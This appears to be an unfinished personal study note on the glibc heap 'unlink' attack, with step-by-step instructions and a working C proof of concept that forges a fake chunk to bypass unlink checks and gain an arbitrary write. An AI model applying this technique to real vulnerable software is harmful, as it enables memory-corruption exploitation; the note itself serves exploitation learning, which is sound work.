---
layout: default
title: Unlink Attacks
tags:
  - pwn
  - heap
---

Unlinking for the heap is the processes of removing free chunks from a bin.

## Steps
1. setup 2 adjacent chunks of smallbins
2. build a fake_chunk at start of chunk1-> and it should overflow into chunk2 metadata so can set `prev_size` and `prev_inuse` bit
3. Enter fake chunk in chunk1
4. Trigger the unlink by freeing chunk 2
5. overwrite chunk1 data with target address



```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct chunk_structure {
    size_t prev_size;
    size_t size;
    struct chunk_structure *fd;
    struct chunk_structure *bk;
    char buf[10];
};

int main () {   

    unsigned long long *chunk1, *chunk2;
    //void *chunk1, *chunk2;
    struct chunk_structure *fake_chunk, *chunk2_hdr;
    char data[20];

    // get to non fastbin chunks
    chunk1 = malloc(0x80);
    chunk2 = malloc(0x80);
    printf("chunk1 ptr : %p\nchunk2 ptr : %p\n", chunk1, chunk2);


    // forge a fake chunk
    fake_chunk = (struct chunk_structure*)chunk1;
    // setup fd and bk pointers to bypass unlink security check
    fake_chunk->fd = (struct chunk_structure*)(&chunk1 - 3); // p->fd->bk == P
    fake_chunk->bk = (struct chunk_structure*)(&chunk1 - 2); // p->bk->fd == p
    printf("Forged fake chunk : %p\nfake_chunk->fd : %p\nfake_chunk->bk : %p\n", &fake_chunk, &fake_chunk->fd, &fake_chunk->bk);

    // modify the header of chunk2 to pass security checks
    chunk2_hdr = (struct chunk_structure*)(chunk2 -2);
    chunk2_hdr->prev_size = 0x80;
    chunk2_hdr->size &= ~1; // uset prev_in_use bit

    printf("Modify chunk2 header : %p\n", &chunk2_hdr);

    
    free(chunk2);
    printf("Now when chunk2 is freed, attacker's fake chunked is unlinked\n");

		 
    chunk1[3] = (unsigned long long)data;
    strcpy(data, "Victim's data");
    printf("Data : %s\n", data);

    chunk1[0] = 0x002164656b636168LL;

    printf("Data : %s\n", data);


    return 0;
}
```

- at least 2 chunks must be allocated
- Make sure that allocated chunks fall in the smallbin range.
- have control of the first chunk and can overflow into second chunk
- A new fake chunk is created in the data part of `chunk1`. The `fd` and `bk` pointers are adjusted to pass the `corrupted double linked list` security check.
- The contents that are overflowed into the second chunk header must set appropriate `prev_size` and `prev_in_use` bit. This ensures that whenever the second chunk is freed, the fake chunk will be detected as 'freed' and will be `unlinked`.  Make sure the `prev_size` is equal to the size of the previous chunk.
- 




```c
struct malloc_chunk {
  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk, if it is free. */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
  struct malloc_chunk* fd;                /* double links -- used only if this chunk is free. */
  struct malloc_chunk* bk;
  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if this chunk is free. */
  struct malloc_chunk* bk_nextsize;
};

typedef struct malloc_chunk* mchunkptr;
```













when a chunk (bigger than the tcache size) is allocated, it is removed from the doubly-linked list



```c
#define unlink(P, BK, FD) {
	FD = P->fd;
	BK = P->bk;
	FD->bk = BK;
	BK->fd = FD;
}

//  p= previous block
```

take 

example

